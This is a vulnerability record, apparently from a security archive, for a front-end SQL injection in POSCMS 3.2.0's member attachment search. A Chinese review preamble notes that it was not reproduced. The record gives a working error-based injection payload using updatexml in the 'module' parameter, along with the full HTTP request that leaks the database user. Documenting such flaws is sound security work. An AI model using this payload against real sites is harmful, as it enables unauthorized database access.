---
source: "hatch 补库批 20260928"
product: "POSCMS3.2.0 attachment search"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "POSCMS 3.2.0 前台sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：前台会员登录并可访问附件管理；DB错误输出"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-7be1569757e47d9f3bc61f71"
entity_id: "ve-7be1569757e47d9f3bc61f71"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：前台会员登录并可访问附件管理；DB错误输出

- **凭据与会话边界（1）**：正文明确用户中心但原始请求只Host不含会话，标题前台不能等同未授权。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **结论使用边界（2）**：记录原博客payload失败及更换updatexml成功是重要实验差异，应保留。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（3）**：源码只图，需补module拼接和过滤；账号/补丁范围未列。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# POSCMS 3.2.0 前台sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

POSCMS 3.2.0

三、复现过程
------------

![1.png](./.resource/POSCMS3.2.0前台sql注入漏洞/media/rId24.png)

查看源码（`\diy\dayrui\models\Attachment_model.php`）可以发现注入点：

![2.png](./.resource/POSCMS3.2.0前台sql注入漏洞/media/rId25.png)

该函数的调用点位于（`\diy\module\member\controllers\Account.php`）：

![3.png](./.resource/POSCMS3.2.0前台sql注入漏洞/media/rId26.png)

对应的功能实际是前台用户中心---\>基本管理---\>附件管理的搜索功能，随便选择某个类别搜索后会看到这条请求：

    GET /index.php?s=member&c=account&m=attachment&module=photo&ext= HTTP/1.1
    Host: www.0-sec.org

向`module`参数注入Payload果然出现了报错：

![4.png](./.resource/POSCMS3.2.0前台sql注入漏洞/media/rId27.png)

但不知道为什么博客里的Payload这里复现失败了，不过已经知道是报错注入，我用了经典的Payload------`" or updatexml(1,concat(1,0x7e,user()),1);#`拼接入参数中，得到了数据库当前用户：

    GET /index.php?s=member&c=account&m=attachment&module=photo%22%20or%20updatexml(1,concat(1,0x7e,user()),1);%23&ext= HTTP/1.1
    Host: www.0-sec.org

![5.png](./.resource/POSCMS3.2.0前台sql注入漏洞/media/rId28.png)

参考链接
--------

> https://xz.aliyun.com/t/4858\#toc-5
